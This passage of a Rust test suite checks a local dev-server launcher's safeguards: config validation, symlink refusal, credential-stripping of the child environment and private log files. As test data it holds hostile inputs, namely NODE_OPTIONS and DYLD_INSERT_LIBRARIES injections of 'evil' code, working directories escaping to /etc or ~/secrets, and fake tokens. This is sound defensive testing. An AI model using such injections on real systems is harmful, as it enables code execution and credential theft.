            ("args as a string", json!({ "name": "x", "command": "pnpm", "args": "dev" })),
            ("command with a space", json!({ "name": "x", "command": "pnpm dev" })),
            ("command is a flag", json!({ "name": "x", "command": "--eval" })),
            ("env", json!({ "name": "x", "command": "pnpm", "env": { "NODE_OPTIONS": "--require ./evil.js" } })),
            ("absolute cwd", json!({ "name": "x", "command": "pnpm", "cwd": "/etc" })),
            ("cwd leaving the project", json!({ "name": "x", "command": "pnpm", "cwd": "../../etc" })),
            ("cwd in home", json!({ "name": "x", "command": "pnpm", "cwd": "~/secrets" })),
            ("odd name", json!({ "name": "we b;", "command": "pnpm" })),
            ("name starting with a dot", json!({ "name": ".hidden", "command": "pnpm" })),
            ("port out of range", json!({ "name": "x", "command": "pnpm", "port": 70000 })),
        ] {
            write_config(&r.0, &json!({ "servers": [entry] }).to_string());
            let c = load_config(&r.0).unwrap();
            assert!(c.servers.is_empty() && c.problems.len() == 1, "refuses {label}");
        }
    }

    #[test]
    fn config_duplicates_cap_and_lookup() {
        let r = root();
        let mut upper = web();
        upper["name"] = json!("WEB");
        upper["command"] = json!("npm");
        write_config(&r.0, &json!({ "servers": [web(), upper] }).to_string());
        let c = load_config(&r.0).unwrap();
        assert_eq!((c.servers.len(), c.servers[0].command.as_str(), c.problems.len()), (1, "pnpm", 1));

        let many: Vec<Value> = (0..30).map(|i| json!({ "name": format!("s{i}"), "command": "node" })).collect();
        write_config(&r.0, &json!({ "servers": many }).to_string());
        let c = load_config(&r.0).unwrap();
        assert_eq!(c.servers.len(), MAX_SERVERS);
        assert!(c.problems.join(",").contains("first 24"));

        write_config(&r.0, &json!({ "servers": [web()] }).to_string());
        let c = load_config(&r.0).unwrap();
        assert_eq!(find_entry(&c.servers, "WEB").map(|s| s.name.as_str()), Some("web"));
        assert!(find_entry(&c.servers, "nope").is_none());
    }

    // The launch command is a POSIX shell line; dev servers are Unix only.
    #[cfg(unix)]
    #[test]
    fn launch_command_matches_the_mcp_tool() {
        let r = root();
        write_config(&r.0, &json!({ "servers": [web()] }).to_string());
        let c = load_config(&r.0).unwrap();
        let root = r.0.display();
        assert_eq!(
            launch_command(&r.0, &c.servers[0]).unwrap(),
            format!("cd {root}/apps/web && pnpm dev > {root}/.puppeteer/dev-servers/web.log 2>&1")
        );
        let api = DevServer {
            name: "api".into(),
            command: "node".into(),
            args: vec!["--title".into(), "my app".into()],
            cwd: ".".into(),
            port: None,
            description: None,
        };
        assert_eq!(
            launch_command(&r.0, &api).unwrap(),
            format!("cd {root} && node --title 'my app' > {root}/.puppeteer/dev-servers/api.log 2>&1")
        );
        assert_eq!(resolve_entry_cwd(&r.0, &c.servers[0]).unwrap(), r.0.join("apps/web"));
        let escaping = DevServer { cwd: "../../etc".into(), ..c.servers[0].clone() };
        assert!(resolve_entry_cwd(&r.0, &escaping).is_err(), "a hand-built entry still cannot leave");
        assert!(launch_command(Path::new("/tmp/it's"), &api).is_err(), "an unquotable path is refused");
    }

    #[cfg(unix)]
    #[test]
    fn symlinks_are_never_used() {
        let r = root();
        let outside = r.0.join("outside.txt");
        std::fs::write(&outside, "GITHUB_TOKEN=keep-me\n").unwrap();
        let log = log_path(&r.0, "web");
        std::fs::create_dir_all(log.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(&outside, &log).unwrap();
        assert!(assert_local_path(&r.0, &log).unwrap_err().contains("symbolic link"));
        let entry = DevServer { name: "web".into(), command: "node".into(), args: vec![], cwd: ".".into(), port: None, description: None };
        assert!(read_log(&r.0, &entry).is_err());
        assert!(open_log(&log).is_err(), "O_NOFOLLOW: no write through a link");
        assert_eq!(std::fs::read_to_string(&outside).unwrap(), "GITHUB_TOKEN=keep-me\n");

        std::fs::remove_file(&log).unwrap();
        std::fs::remove_dir(log.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(&r.0, log.parent().unwrap()).unwrap();
        assert!(assert_local_path(&r.0, &log).is_err(), "a linked log directory");

        let other = root();
        std::fs::remove_file(log.parent().unwrap()).unwrap();
        std::fs::remove_dir(r.0.join(CONFIG_DIR)).unwrap();
        std::os::unix::fs::symlink(&other.0, r.0.join(CONFIG_DIR)).unwrap();
        assert!(load_config(&r.0).is_err(), "a linked .puppeteer");
    }

    #[test]
    fn clean_env_drops_every_credential() {
        let parent: Vec<(OsString, OsString)> = [
            ("HOME", "/Users/me"),
            ("PATH", "/usr/bin:/bin"),
            ("LANG", "en_US.UTF-8"),
            ("LC_ALL", "en_US.UTF-8"),
            ("TMPDIR", "/tmp/x"),
            ("GH_TOKEN", "ghp_secret"),
            ("GITHUB_TOKEN", "ghp_secret"),
            ("GITLAB_TOKEN", "glpat-secret"),
            ("AWS_ACCESS_KEY_ID", "AKIA0000"),
            ("AWS_SECRET_ACCESS_KEY", "secret"),
            ("AWS_SESSION_TOKEN", "secret"),
            ("AWS_PROFILE", "prod"),
            ("AZURE_CLIENT_SECRET", "secret"),
            ("ANTHROPIC_API_KEY", "sk-ant-secret"),
            ("OPENAI_API_KEY", "sk-secret"),
            ("NODE_OPTIONS", "--require ./evil.js"),
            ("DYLD_INSERT_LIBRARIES", "/tmp/evil.dylib"),
            ("SSH_AUTH_SOCK", "/tmp/agent.sock"),
            ("PUPPETEER_BROKER_SOCK", "/tmp/broker.sock"),
        ]
        .into_iter()
        .map(|(k, v)| (k.into(), v.into()))
        .collect();
        let env = clean_env(parent);
        let keys: Vec<&str> = env.iter().map(|(k, _)| k.to_str().unwrap()).collect();
        assert_eq!(keys, ["HOME", "PATH", "LANG", "LC_ALL", "TMPDIR"]);
    }

    #[test]
    fn lsof_writers_only() {
        let out = "p100\nf1\naw\nf2\nau\np200\nf3\nar\np1\naw\np300\nf9\nau\n";
        assert_eq!(parse_lsof(out, 300), [100]);
    }

    #[test]
    fn strips_ansi_and_redraws() {
        assert_eq!(strip_ansi("\x1b[31mERROR\x1b[0m x\r\nnext"), "ERROR x\nnext");
        assert_eq!(strip_ansi("10%\r50%\r100%"), "100%");
        assert_eq!(strip_ansi("\x1b]0;title\x07ok\x1bM"), "ok");
        assert_eq!(strip_ansi("\x1b]8;;https://x\x1b\\link\x1b]8;;\x1b\\"), "link");
    }

    #[test]
    fn status_reads_like_the_mcp_tool() {
        assert_eq!(status_of(Some(&[5]), Some(3000), Some(true)), "running");
        assert_eq!(status_of(Some(&[]), Some(3000), Some(true)), "port_busy");
        assert_eq!(status_of(None, None, None), "unknown");
        assert_eq!(status_of(None, Some(3000), Some(false)), "stopped");
        assert_eq!(status_of(Some(&[]), None, None), "stopped");
    }

    fn sleeper() -> DevServer {
        DevServer { name: "web".into(), command: "sleep".into(), args: vec!["30".into()], cwd: ".".into(), port: None, description: None }
    }

    async fn gone(pid: u32) -> bool {
        for _ in 0..50 {
            if !super::super::ps::snapshot().unwrap_or_default().iter().any(|r| r.pid == pid && !r.is_zombie()) {
                return true;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        false
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_second_copy_is_refused_and_stop_ends_it() {
        let r = root();
        let servers = DevServers::default();
        let env = clean_env(std::env::vars_os());
        let pid = servers.start(&r.0, &sleeper(), env.clone(), None).await.unwrap();
        let log = log_path(&r.0, "web");
        assert!(log.is_file());
        if let Some(writers) = log_writers(&log).await {
            assert_eq!(writers, [pid], "the server writes its log; the app does not");
        }
        let err = servers.start(&r.0, &sleeper(), env.clone(), None).await.unwrap_err();
        assert!(err.contains("already running"), "{err}");

        // Started by someone else (the agent's shell): still found by its log.
        let other = DevServers::default();
        if log_writers(&log).await.is_some() {
            let err = other.start(&r.0, &sleeper(), env, None).await.unwrap_err();
            assert!(err.contains("already running"), "{err}");
        }

        assert!(servers.stop(&r.0, &sleeper()).await.unwrap() >= 1);
        assert!(gone(pid).await);
        let err = servers.stop(&r.0, &sleeper()).await.unwrap_err();
        assert!(err.contains("not running"), "{err}");
    }

    #[tokio::test]
    async fn a_taken_port_is_refused() {
        let r = root();
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let entry = DevServer { port: Some(port), ..sleeper() };
        let err = DevServers::default().start(&r.0, &entry, vec![], None).await.unwrap_err();
        assert!(err.contains(&format!("Port {port}")), "{err}");
        assert!(!log_path(&r.0, "web").exists(), "nothing started, no log");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn the_server_sees_only_the_env_it_is_given() {
        let r = root();
        let mut parent: Vec<(OsString, OsString)> = std::env::vars_os().collect();
        parent.push(("GH_TOKEN".into(), "ghp_from_parent".into()));
        parent.push(("AWS_SECRET_ACCESS_KEY".into(), "aws_from_parent".into()));
        let entry = DevServer { name: "env".into(), command: "env".into(), args: vec![], cwd: ".".into(), port: None, description: None };
        let pid = DevServers::default().start(&r.0, &entry, clean_env(parent), None).await.unwrap();
        assert!(gone(pid).await);
        let log = std::fs::read_to_string(log_path(&r.0, "env")).unwrap();
        assert!(log.contains("PATH="), "{log}");
        for secret in ["GH_TOKEN", "AWS_", "ghp_from_parent", "aws_from_parent"] {
            assert!(!log.contains(secret), "{secret} leaked: {log}");
        }
    }

    // Start opens the log with truncate: when lsof cannot tell whether a copy
    // writes it, going on would wipe the log of a running server.
    #[test]
    fn start_is_refused_when_lsof_cannot_tell() {
        let e = sleeper();
        assert!(not_running(&e, None, Some(vec![])).is_ok());
        assert!(not_running(&e, None, Some(vec![42])).unwrap_err().contains("already running"));
        assert!(not_running(&e, Some(7), None).unwrap_err().contains("already running"));
        let err = not_running(&e, None, None).unwrap_err();
        assert!(err.contains("lsof"), "{err}");
    }

    #[test]
    fn config_drops_a_second_server_on_one_port() {
        let r = root();
        let mut api = web();
        api["name"] = json!("api");
        write_config(&r.0, &json!({ "servers": [web(), api, { "name": "worker", "command": "node" }] }).to_string());
        let c = load_config(&r.0).unwrap();
        assert_eq!(names(&c), ["web", "worker"]);
        assert!(c.problems.join(",").contains("port 3000"), "{:?}", c.problems);
    }

    // Before the first one listens, the port probe sees nothing.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_port_held_by_a_server_started_here_is_refused() {
        let r = root();
        let port = std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port();
        let servers = DevServers::default();
        let env = clean_env(std::env::vars_os());
        let first = DevServer { port: Some(port), ..sleeper() };
        let pid = servers.start(&r.0, &first, env.clone(), None).await.unwrap();
        let second = DevServer { name: "web2".into(), ..first.clone() };
        let res = servers.start(&r.0, &second, env, None).await;
        servers.stop(&r.0, &first).await.unwrap();
        if let Ok(other) = res {
            let _ = servers.stop(&r.0, &second).await;
            panic!("a second server started on port {port} (pid {other}, first {pid})");
        }
        assert!(res.unwrap_err().contains(&format!("Port {port}")));
        assert!(gone(pid).await);
    }

    // The agent's shell creates the log with its umask; a later Start keeps it
    // unless it sets the mode itself.
    #[cfg(unix)]
    #[test]
    fn the_log_is_private_even_when_it_already_exists() {
        use std::os::unix::fs::PermissionsExt;
        let r = root();
        let log = log_path(&r.0, "web");
        std::fs::create_dir_all(log.parent().unwrap()).unwrap();
        std::fs::write(&log, "old\n").unwrap();
        std::fs::set_permissions(&log, std::fs::Permissions::from_mode(0o644)).unwrap();
        drop(open_log(&log).unwrap());
        assert_eq!(std::fs::metadata(&log).unwrap().permissions().mode() & 0o777, 0o600);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_cwd_linked_out_of_the_project_is_refused() {
        let r = root();
        let outside = root();
        std::os::unix::fs::symlink(&outside.0, r.0.join("apps")).unwrap();
        let entry = DevServer { command: "true".into(), args: vec![], cwd: "apps".into(), ..sleeper() };
        let res = DevServers::default().start(&r.0, &entry, clean_env(std::env::vars_os()), None).await;
        let err = res.expect_err("the server ran outside the project");
        assert!(err.contains("symbolic link"), "{err}");
    }
}
